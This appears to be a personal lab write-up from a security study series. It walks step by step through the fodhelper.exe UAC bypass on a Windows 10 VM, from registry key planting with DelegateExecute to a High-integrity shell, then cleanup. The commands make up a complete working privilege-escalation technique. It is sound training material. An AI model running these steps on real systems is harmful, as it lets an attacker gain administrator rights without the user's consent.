# Day 70 — Labs: UAC Bypass using fodhelper.exe

**Environment:** Windows 10 VM inside VirtualBox inside Ubuntu 24.04
**All commands run in normal CMD — not Run as Administrator**

---

## Lab 1 — Verify Starting Integrity Level

```cmd
whoami /groups | findstr "Mandatory Label"
```

- `whoami` — prints info about the currently logged-in user
- `/groups` — shows all groups and integrity labels assigned to your current process
- `|` — pipe — feeds output into the next command
- `findstr "Mandatory Label"` — filters only the integrity label line

Expected: `Mandatory Label\Medium Mandatory Level`

---

## Lab 2 — Create the Registry Key

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\Command" /f
```

- `reg add` — creates a new registry key
- `"HKCU\Software\Classes\ms-settings\Shell\Open\Command"` — path that `fodhelper.exe` checks on launch
- `/f` — force, no confirmation prompt

---

## Lab 3 — Set the Payload as Default Value

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\Command" /ve /d "cmd.exe" /f
```

- `/ve` — sets the default value of the key
- `/d "cmd.exe"` — command that executes when `fodhelper.exe` reads this key
- `/f` — force

---

## Lab 4 — Add DelegateExecute Value

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\Command" /v "DelegateExecute" /d "" /f
```

- `/v "DelegateExecute"` — adds value named DelegateExecute
- `/d ""` — empty string data
- `fodhelper.exe` checks for this — without it bypass does not trigger

---

## Lab 5 — Trigger the Bypass

```cmd
fodhelper.exe
```

- Launches legitimate Windows binary
- Windows auto-elevates it to High integrity — no UAC popup
- Reads planted key — executes cmd.exe at High integrity

---

## Lab 6 — Verify High Integrity in New CMD

**Run in the new CMD window that just opened:**

```cmd
whoami /groups | findstr "Mandatory Label"
```

Expected: `Mandatory Label\High Mandatory Level`

---

## Lab 7 — Clean Up (Mandatory)

```cmd
reg delete "HKCU\Software\Classes\ms-settings" /f
```

- `reg delete` — removes registry key
- Parent key deleted — removes everything planted underneath
- `/f` — force, no confirmation

Verify cleanup:

```cmd
reg query "HKCU\Software\Classes\ms-settings"
```

Expected: `ERROR: The system was unable to find the specified registry key or value.`